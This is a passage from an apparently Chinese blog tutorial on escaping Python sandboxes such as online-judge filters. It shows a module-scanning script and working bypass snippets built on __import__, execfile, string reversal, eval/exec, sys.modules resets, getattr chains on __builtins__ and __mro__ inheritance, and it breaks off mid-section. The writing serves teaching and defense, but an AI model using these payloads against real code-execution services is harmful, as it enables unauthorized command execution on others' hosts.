&#39;_functools&#39;, &#39;dummy_thread&#39;, &#39;platform&#39;, &#39;token&#39;, &#39;_hashlib&#39;, &#39;dummy_threading&#39;, &#39;plistlib&#39;, &#39;tokenize&#39;, &#39;_heapq&#39;, &#39;email&#39;, &#39;popen2&#39;, &#39;trace&#39;, &#39;_hotshot&#39;, &#39;encodings&#39;, &#39;poplib&#39;, &#39;traceback&#39;, &#39;_io&#39;, &#39;ensurepip&#39;, &#39;posix&#39;, &#39;ttk&#39;, &#39;_json&#39;, &#39;errno&#39;, &#39;posixfile&#39;, &#39;tty&#39;, &#39;_locale&#39;, &#39;exceptions&#39;, &#39;posixpath&#39;, &#39;turtle&#39;, &#39;_lsprof&#39;, &#39;fcntl&#39;, &#39;pprint&#39;, &#39;types&#39;, &#39;_md5&#39;, &#39;filecmp&#39;, &#39;profile&#39;, &#39;unicodedata&#39;, &#39;_multibytecodec&#39;, &#39;fileinput&#39;, &#39;pstats&#39;, &#39;unittest&#39;, &#39;_multiprocessing&#39;, &#39;fnmatch&#39;, &#39;pty&#39;, &#39;urllib&#39;, &#39;_osx_support&#39;, &#39;formatter&#39;, &#39;pwd&#39;, &#39;urllib2&#39;, &#39;_pyio&#39;, &#39;fpformat&#39;, &#39;py_compile&#39;, &#39;urlparse&#39;, &#39;_random&#39;, &#39;fractions&#39;, &#39;pyclbr&#39;, &#39;user&#39;, &#39;_sha&#39;, &#39;ftplib&#39;, &#39;pydoc&#39;, &#39;uu&#39;, &#39;_sha256&#39;, &#39;functools&#39;, &#39;pydoc_data&#39;, &#39;uuid&#39;, &#39;_sha512&#39;, &#39;future_builtins&#39;, &#39;pyexpat&#39;, &#39;warnings&#39;, &#39;_socket&#39;, &#39;gc&#39;, &#39;quopri&#39;, &#39;wave&#39;, &#39;_sqlite3&#39;, &#39;genericpath&#39;, &#39;random&#39;, &#39;weakref&#39;, &#39;_sre&#39;, &#39;getopt&#39;, &#39;re&#39;, &#39;webbrowser&#39;, &#39;_ssl&#39;, &#39;getpass&#39;, &#39;readline&#39;, &#39;whichdb&#39;, &#39;_strptime&#39;, &#39;gettext&#39;, &#39;repr&#39;, &#39;wsgiref&#39;, &#39;_struct&#39;, &#39;glob&#39;, &#39;resource&#39;, &#39;xdrlib&#39;, &#39;_symtable&#39;, &#39;grp&#39;, &#39;rexec&#39;, &#39;xml&#39;, &#39;_sysconfigdata&#39;, &#39;gzip&#39;, &#39;rfc822&#39;, &#39;xmllib&#39;, &#39;_sysconfigdata_nd&#39;, &#39;hashlib&#39;, &#39;rlcompleter&#39;, &#39;xmlrpclib&#39;, &#39;_testcapi&#39;, &#39;heapq&#39;, &#39;robotparser&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;hmac&#39;, &#39;runpy&#39;, &#39;zipfile&#39;, &#39;_warnings&#39;, &#39;hotshot&#39;, &#39;sched&#39;, &#39;zipimport&#39;, &#39;_weakref&#39;, &#39;htmlentitydefs&#39;, &#39;select&#39;, &#39;zlib&#39;, &#39;_weakrefset&#39;, &#39;htmllib&#39;, &#39;sets&#39;, &#39;abc&#39;, &#39;httplib&#39;, &#39;sgmllib&#39;, &#39;aifc&#39;, &#39;ihooks&#39;, &#39;sha&#39;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">all_modules_3 &#x3D; [</span><br><span class="line">    &#39;AptUrl&#39;, &#39;hmac&#39;, &#39;requests_unixsocket&#39;, &#39;CommandNotFound&#39;, &#39;apport&#39;, &#39;hpmudext&#39;, &#39;resource&#39;, &#39;Crypto&#39;, &#39;apport_python_hook&#39;, &#39;html&#39;, &#39;rlcompleter&#39;, &#39;DistUpgrade&#39;, &#39;apt&#39;, &#39;http&#39;, &#39;runpy&#39;, &#39;HweSupportStatus&#39;, &#39;apt_inst&#39;, &#39;httplib2&#39;, &#39;scanext&#39;, &#39;LanguageSelector&#39;, &#39;apt_pkg&#39;, &#39;idna&#39;, &#39;sched&#39;, &#39;NvidiaDetector&#39;, &#39;aptdaemon&#39;, &#39;imaplib&#39;, &#39;secrets&#39;, &#39;PIL&#39;, &#39;aptsources&#39;, &#39;imghdr&#39;, &#39;secretstorage&#39;, &#39;Quirks&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;select&#39;, &#39;UbuntuDrivers&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;selectors&#39;, &#39;UbuntuSystemService&#39;, &#39;asn1crypto&#39;, &#39;inspect&#39;, &#39;shelve&#39;, &#39;UpdateManager&#39;, &#39;ast&#39;, &#39;io&#39;, &#39;shlex&#39;, &#39;__future__&#39;, &#39;asynchat&#39;, &#39;ipaddress&#39;, &#39;shutil&#39;, &#39;_ast&#39;, &#39;asyncio&#39;, &#39;itertools&#39;, &#39;signal&#39;, &#39;_asyncio&#39;, &#39;asyncore&#39;, &#39;janitor&#39;, &#39;simplejson&#39;, &#39;_bisect&#39;, &#39;atexit&#39;, &#39;json&#39;, &#39;site&#39;, &#39;_blake2&#39;, &#39;audioop&#39;, &#39;keyring&#39;, &#39;sitecustomize&#39;, &#39;_bootlocale&#39;, &#39;base64&#39;, &#39;keyword&#39;, &#39;six&#39;, &#39;_bz2&#39;, &#39;bdb&#39;, &#39;language_support_pkgs&#39;, &#39;smtpd&#39;, &#39;_cffi_backend&#39;, &#39;binascii&#39;, &#39;launchpadlib&#39;, &#39;smtplib&#39;, &#39;_codecs&#39;, &#39;binhex&#39;, &#39;linecache&#39;, &#39;sndhdr&#39;, &#39;_codecs_cn&#39;, &#39;bisect&#39;, &#39;locale&#39;, &#39;socket&#39;, &#39;_codecs_hk&#39;, &#39;brlapi&#39;, &#39;logging&#39;, &#39;socketserver&#39;, &#39;_codecs_iso2022&#39;, &#39;builtins&#39;, &#39;louis&#39;, &#39;softwareproperties&#39;, &#39;_codecs_jp&#39;, &#39;bz2&#39;, &#39;lsb_release&#39;, &#39;speechd&#39;, &#39;_codecs_kr&#39;, &#39;cProfile&#39;, &#39;lzma&#39;, &#39;speechd_config&#39;, &#39;_codecs_tw&#39;, &#39;cairo&#39;, &#39;macaroonbakery&#39;, &#39;spwd&#39;, &#39;_collections&#39;, &#39;calendar&#39;, &#39;macpath&#39;, &#39;sqlite3&#39;, &#39;_collections_abc&#39;, &#39;certifi&#39;, &#39;macurl2path&#39;, &#39;sre_compile&#39;, &#39;_compat_pickle&#39;, &#39;cgi&#39;, &#39;mailbox&#39;, &#39;sre_constants&#39;, &#39;_compression&#39;, &#39;cgitb&#39;, &#39;mailcap&#39;, &#39;sre_parse&#39;, &#39;_crypt&#39;, &#39;chardet&#39;, &#39;mako&#39;, &#39;ssl&#39;, &#39;_csv&#39;, &#39;chunk&#39;, &#39;markupsafe&#39;, &#39;stat&#39;, &#39;_ctypes&#39;, &#39;cmath&#39;, &#39;marshal&#39;, &#39;statistics&#39;, &#39;_ctypes_test&#39;, &#39;cmd&#39;, &#39;math&#39;, &#39;string&#39;, &#39;_curses&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;stringprep&#39;, &#39;_curses_panel&#39;, &#39;codecs&#39;, &#39;mmap&#39;, &#39;struct&#39;, &#39;_datetime&#39;, &#39;codeop&#39;, &#39;modual_test&#39;, &#39;subprocess&#39;, &#39;_dbm&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sunau&#39;, &#39;_dbus_bindings&#39;, &#39;colorsys&#39;, &#39;multiprocessing&#39;, &#39;symbol&#39;, &#39;_dbus_glib_bindings&#39;, &#39;compileall&#39;, &#39;nacl&#39;, &#39;symtable&#39;, &#39;_decimal&#39;, &#39;concurrent&#39;, &#39;netrc&#39;, &#39;sys&#39;, &#39;_dummy_thread&#39;, &#39;configparser&#39;, &#39;nis&#39;, &#39;sysconfig&#39;, &#39;_elementtree&#39;, &#39;contextlib&#39;, &#39;nntplib&#39;, &#39;syslog&#39;, &#39;_functools&#39;, &#39;copy&#39;, &#39;ntpath&#39;, &#39;systemd&#39;, &#39;_gdbm&#39;, &#39;copyreg&#39;, &#39;nturl2path&#39;, &#39;tabnanny&#39;, &#39;_hashlib&#39;, &#39;crypt&#39;, &#39;numbers&#39;, &#39;tarfile&#39;, &#39;_heapq&#39;, &#39;cryptography&#39;, &#39;oauth&#39;, &#39;telnetlib&#39;, &#39;_imp&#39;, &#39;csv&#39;, &#39;olefile&#39;, &#39;tempfile&#39;, &#39;_io&#39;, &#39;ctypes&#39;, &#39;opcode&#39;, &#39;termios&#39;, &#39;_json&#39;, &#39;cups&#39;, &#39;operator&#39;, &#39;test&#39;, &#39;_locale&#39;, &#39;cupsext&#39;, &#39;optparse&#39;, &#39;textwrap&#39;, &#39;_lsprof&#39;, &#39;cupshelpers&#39;, &#39;orca&#39;, &#39;_lzma&#39;, &#39;curses&#39;, &#39;os&#39;, &#39;threading&#39;, &#39;_markupbase&#39;, &#39;datetime&#39;, &#39;ossaudiodev&#39;, &#39;time&#39;, &#39;_md5&#39;, &#39;dbm&#39;, &#39;parser&#39;, &#39;timeit&#39;, &#39;_multibytecodec&#39;, &#39;dbus&#39;, &#39;pathlib&#39;, &#39;token&#39;, &#39;_multiprocessing&#39;, &#39;deb822&#39;, &#39;pcardext&#39;, &#39;tokenize&#39;, &#39;_opcode&#39;, &#39;debconf&#39;, &#39;pdb&#39;, &#39;trace&#39;, &#39;_operator&#39;, &#39;debian&#39;, &#39;pexpect&#39;, &#39;traceback&#39;, &#39;_osx_support&#39;, &#39;debian_bundle&#39;, &#39;pickle&#39;, &#39;tracemalloc&#39;, &#39;_pickle&#39;, &#39;decimal&#39;, &#39;pickletools&#39;, &#39;tty&#39;, &#39;_posixsubprocess&#39;, &#39;defer&#39;, &#39;pipes&#39;, &#39;turtle&#39;, &#39;_pydecimal&#39;, &#39;difflib&#39;, &#39;pkg_resources&#39;, &#39;types&#39;, &#39;_pyio&#39;, &#39;dis&#39;, &#39;pkgutil&#39;, &#39;typing&#39;, &#39;_random&#39;, &#39;distro_info&#39;, &#39;platform&#39;, &#39;ufw&#39;, &#39;_sha1&#39;, &#39;distro_info_test&#39;, &#39;plistlib&#39;, &#39;unicodedata&#39;, &#39;_sha256&#39;, &#39;distutils&#39;, &#39;poplib&#39;, &#39;unittest&#39;, &#39;_sha3&#39;, &#39;doctest&#39;, &#39;posix&#39;, &#39;urllib&#39;, &#39;_sha512&#39;, &#39;dummy_threading&#39;, &#39;posixpath&#39;, &#39;urllib3&#39;, &#39;_signal&#39;, &#39;email&#39;, &#39;pprint&#39;, &#39;usbcreator&#39;, &#39;_sitebuiltins&#39;, &#39;encodings&#39;, &#39;problem_report&#39;, &#39;uu&#39;, &#39;_socket&#39;, &#39;enum&#39;, &#39;profile&#39;, &#39;uuid&#39;, &#39;_sqlite3&#39;, &#39;errno&#39;, &#39;pstats&#39;, &#39;venv&#39;, &#39;_sre&#39;, &#39;faulthandler&#39;, &#39;pty&#39;, &#39;wadllib&#39;, &#39;_ssl&#39;, &#39;fcntl&#39;, &#39;ptyprocess&#39;, &#39;warnings&#39;, &#39;_stat&#39;, &#39;filecmp&#39;, &#39;pwd&#39;, &#39;wave&#39;, &#39;_string&#39;, &#39;fileinput&#39;, &#39;py_compile&#39;, &#39;weakref&#39;, &#39;_strptime&#39;, &#39;fnmatch&#39;, &#39;pyatspi&#39;, &#39;webbrowser&#39;, &#39;_struct&#39;, &#39;formatter&#39;, &#39;pyclbr&#39;, &#39;wsgiref&#39;, &#39;_symtable&#39;, &#39;fractions&#39;, &#39;pydoc&#39;, &#39;xdg&#39;, &#39;_sysconfigdata_m_linux_x86_64-linux-gnu&#39;, &#39;ftplib&#39;, &#39;pydoc_data&#39;, &#39;xdrlib&#39;, &#39;_testbuffer&#39;, &#39;functools&#39;, &#39;pyexpat&#39;, &#39;xkit&#39;, &#39;_testcapi&#39;, &#39;gc&#39;, &#39;pygtkcompat&#39;, &#39;xml&#39;, &#39;_testimportmultiple&#39;, &#39;genericpath&#39;, &#39;pymacaroons&#39;, &#39;xmlrpc&#39;, &#39;_testmultiphase&#39;, &#39;getopt&#39;, &#39;pyrfc3339&#39;, &#39;xxlimited&#39;, &#39;_thread&#39;, &#39;getpass&#39;, &#39;pytz&#39;, &#39;xxsubtype&#39;, &#39;_threading_local&#39;, &#39;gettext&#39;, &#39;queue&#39;, &#39;yaml&#39;, &#39;_tracemalloc&#39;, &#39;gi&#39;, &#39;quopri&#39;, &#39;zipapp&#39;, &#39;_warnings&#39;, &#39;glob&#39;, &#39;random&#39;, &#39;zipfile&#39;, &#39;_weakref&#39;, &#39;grp&#39;, &#39;re&#39;, &#39;zipimport&#39;, &#39;_weakrefset&#39;, &#39;gtweak&#39;, &#39;readline&#39;, &#39;zlib&#39;, &#39;_yaml&#39;, &#39;gzip&#39;, &#39;reportlab&#39;, &#39;zope&#39;, &#39;abc&#39;, &#39;hashlib&#39;, &#39;reprlib&#39;, &#39;aifc&#39;, &#39;heapq&#39;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">methods &#x3D; [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;]</span><br><span class="line"></span><br><span class="line">results &#x3D; &#123;&#125;</span><br><span class="line">for module in all_modules_3:</span><br><span class="line">    results[module] &#x3D; &#123;</span><br><span class="line">        &#39;flag&#39;: 0,</span><br><span class="line">        &#39;result&#39;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        m &#x3D; __import__(module)</span><br><span class="line">        attrs &#x3D; dir(m)</span><br><span class="line">        for method in methods:</span><br><span class="line">            if method in attrs:</span><br><span class="line">                result &#x3D; &#39;yes&#39;</span><br><span class="line">                results[module][&#39;flag&#39;] &#x3D; 1</span><br><span class="line">            else:</span><br><span class="line">                result &#x3D; &#39;no&#39;</span><br><span class="line"></span><br><span class="line">            results[module][&#39;result&#39;][method] &#x3D; result</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">for result in results:</span><br><span class="line">    if results[result][&#39;flag&#39;]:</span><br><span class="line">        print(&#39;[+]&#39; + result)</span><br><span class="line">        for r in results[result][&#39;result&#39;]:</span><br><span class="line">            print(&#39;  [-]&#39; + r + &#39;: &#39; + results[result][&#39;result&#39;][r])</span><br></pre></td></tr></table></figure>

<p><code>all_modules_2</code>就是 2.x 的标准库，<code>all_modules_3</code> 就是 3.x 的标准库。</p>
<p>结果相当多，这里就不贴了。这里注意一下，这个文件别命名为 <code>test.py</code>，如果命名为 test 会怎么样呢？可以先猜一猜，后面会给解释。</p>
<p>如果 oj 支持 <code>import</code> 的话，这些库都是高危的，放任不管基本上是坐等被日。所以为了避免过滤不完善导致各种问题，在 Python 沙箱套一层 docker 肯定不会是坏事。</p>
<h3 id="花式-import"><a href="#花式-import" class="headerlink" title="花式 import"></a>花式 import</h3><p>首先，禁用 <code>import os</code> 肯定是不行的，因为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import  os</span><br><span class="line">import   os</span><br><span class="line">import    os</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>都可以。如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__(&#39;os&#39;)</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code></p>
<p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)</span><br><span class="line">system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&#39;&#x2F;usr&#x2F;lib&#x2F;python3.6&#x2F;os.py&#39;,&#39;r&#39;) as f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>这个方法倒是 2.x、3.x 通用的。</p>
<p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">print(sys.path)</span><br></pre></td></tr></table></figure>

<h3 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h3><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#39;so&#39;[::-1]).system(&#39;ls&#39;)</span><br><span class="line">b &#x3D; &#39;o&#39;</span><br><span class="line">a &#x3D; &#39;s&#39;</span><br><span class="line">__import__(a+b).system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&#39;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#39;[::-1])</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; exec(&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;[::-1])</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure>

<p>顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了。。。</p>
<h3 id="恢复-sys-modules"><a href="#恢复-sys-modules" class="headerlink" title="恢复 sys.modules"></a>恢复 sys.modules</h3><p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p>
<p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; sys.modules[&#39;os&#39;] &#x3D; &#39;not allowed&#39;</span><br><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; os.system(&#39;ls&#39;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &#39;str&#39; object has no attribute &#39;system&#39;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>注意，这里不能用 <code>del sys.modules[&#39;os&#39;]</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p>
<p>所以删了 <code>sys.modules[&#39;os&#39;]</code> 只会让 Python 重新加载一次 os。</p>
<p>看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[&#39;os&#39;] &#x3D; &#39;not allowed&#39; # oj 为你加的</span><br><span class="line"></span><br><span class="line">del sys.modules[&#39;os&#39;]</span><br><span class="line">import os</span><br><span class="line">os.system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>最后还有一种利用 <code>__builtins__</code> 导入的方式，下面会详细说。</p>
<h3 id="花式执行函数"><a href="#花式执行函数" class="headerlink" title="花式执行函数"></a>花式执行函数</h3><p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p>
<p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(os.system(&#39;whoami&#39;))</span><br><span class="line">print(os.popen(&#39;whoami&#39;).read()) </span><br><span class="line">print(os.popen2(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">print(os.popen3(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">print(os.popen4(&#39;whoami&#39;).read()) # 2.x</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>应该还有一些，可以在这里找找：</p>
<p><a href="https://docs.python.org/2/library/os.html" target="_blank" rel="noopener">2.x 传送门</a></p>
<p><a href="https://docs.python.org/3/library/os.html" target="_blank" rel="noopener">3.x 传送门</a></p>
<p>过滤<code>system</code>的时候说不定还有其他函数给漏了。</p>
<p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">getattr(os, &#39;metsys&#39;[::-1])(&#39;whoami&#39;)</span><br></pre></td></tr></table></figure>

<p>不让出现 import也没事：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p>
<p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p>
<h3 id="builtins、builtin与builtins"><a href="#builtins、builtin与builtins" class="headerlink" title="builtins、builtin与builtins"></a>builtins、<strong>builtin</strong>与<strong>builtins</strong></h3><p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python    对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。</p>
<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p>
<p>2.x：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import __builtin__</span><br><span class="line">&gt;&gt;&gt; __builtin__</span><br><span class="line">&lt;module &#39;__builtin__&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>

<p>3.x：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import builtins</span><br><span class="line">&gt;&gt;&gt; builtins</span><br><span class="line">&lt;module &#39;builtins&#39; (built-in)&gt;</span><br></pre></td></tr></table></figure>

<p>但是，<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，<code>__builtins__</code> 相对实用一点，并且在    <code>__builtins__</code>里有很多好东西：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;__import__&#39; in dir(__builtins__)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).system(&#39;whoami&#39;)</span><br><span class="line">macr0phag3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; &#39;eval&#39; in dir(__builtins__)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#39;execfile&#39; in dir(__builtins__)</span><br><span class="line">True</span><br></pre></td></tr></table></figure>

<p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#39;eval&#39;] &#x3D; &#39;not allowed&#39;</span><br></pre></td></tr></table></figure>

<p>或者直接删了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__.__dict__[&#39;eval&#39;]</span><br></pre></td></tr></table></figure>

<p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用    <code>exec command in _global</code> 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。</p>
<p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code>。你看，reload 的参数是 <code>module</code>，所以肯定还能用于重新载入其他模块，这个放在下面说。</p>
<h3 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h3><p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的    C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，叫<code>__mro__</code>，是个元组，记录了继承关系：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__</span><br><span class="line">(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</span><br></pre></td></tr></table></figure>

<p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class test:</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; test.__bases__</span><br><span class="line">&gt;&gt;&gt; class test(object):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; test.__bases__</span><br><span class="line">(&lt;type &#39;object&#39;&gt;,)</span><br></pre></td></tr></table></figure>

<p>那么知道这个有什么用呢？</p>
<p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os（<code>__globals__</code>是函数所在的全局命名空间中所定义的全局变量）。例如，<code>site</code> 这个库就有 <code>os</code>：</p>
